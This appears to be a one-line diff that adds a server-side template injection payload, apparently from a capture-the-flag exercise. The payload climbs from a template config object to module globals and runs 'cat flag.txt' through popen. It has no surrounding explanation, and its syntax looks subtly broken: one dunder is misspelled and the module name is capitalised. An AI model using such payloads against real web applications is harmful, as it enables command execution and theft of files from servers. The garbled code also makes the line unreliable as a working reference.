@@ -1,0 +1,1 @@
+{{ config.__class_.__init__.__globals__['OS'].popen('cat flag.txt').read() }}
